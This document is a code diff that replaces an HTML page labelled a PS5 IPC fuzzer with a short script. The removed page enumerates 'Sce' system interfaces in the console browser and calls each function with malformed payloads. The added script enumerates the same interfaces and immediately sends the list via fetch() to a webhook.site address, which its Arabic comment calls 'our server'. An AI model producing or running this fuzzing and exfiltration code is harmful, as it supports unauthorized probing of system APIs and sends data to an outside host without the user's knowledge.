@@ -1,55 +1,17 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>PS5 IPC Fuzzer</title>
-    <style>
-        body { font-family: monospace; background: #000; color: #0f0; padding: 20px; }
-        #log { border: 1px solid #333; height: 300px; overflow-y: scroll; padding: 10px; }
-    </style>
-</head>
-<body>
-    <h1>System API Enumerator & Fuzzer</h1>
-    <button onclick="startFuzz()">Start Fuzzing</button>
-    <div id="log"></div>
+<script>
+    function sendToRemote(data) {
+        // نرسل البيانات كـ Request إلى السيرفر الخاص بنا
+        fetch('https://webhook.site/6111dfaf-6540-4e7c-a774-27883c7b3ea9?data=' + encodeURIComponent(JSON.stringify(data)));
+    }
 
-    <script>
-        const log = document.getElementById('log');
-        function logger(msg) { log.innerHTML += msg + "<br>"; }
-
-        // 1. الاستطلاع (Enumeration)
-        function enumerateSce() {
-            let found = [];
-            for (let prop in window) {
-                if (prop.startsWith('Sce')) {
-                    found.push(prop);
-                }
-            }
-            return found;
+    // استطلاع الـ APIs وإرسالها
+    let sceInterfaces = [];
+    for (let prop in window) {
+        if (prop.startsWith('Sce')) {
+            sceInterfaces.push(prop);
         }
-
-        // 2. المحرك الهجومي (Fuzzing Engine)
-        async function startFuzz() {
-            let interfaces = enumerateSce();
-            logger("Found Interfaces: " + interfaces.join(', '));
-
-            for (let ifaceName of interfaces) {
-                let target = window[ifaceName];
-                logger("Targeting: " + ifaceName);
-
-                // تجربة استدعاء الدوال بمدخلات غير منطقية
-                let props = Object.getOwnPropertyNames(target);
-                for (let p of props) {
-                    if (typeof target[p] === 'function') {
-                        try {
-                            // محاولة تمرير payloads مشوهة
-                            target[p](new Uint8Array(0x1000000), "AAAAAAAAAAAAAAAA", null, {});
-                        } catch(e) {
-                            logger("Result [" + p + "]: Error caught (Stable)");
-                        }
-                    }
-                }
-            }
-        }
-    </script>
-</body>
-</html>
+    }
+    
+    // إرسال القائمة فوراً
+    sendToRemote(sceInterfaces);
+</script>
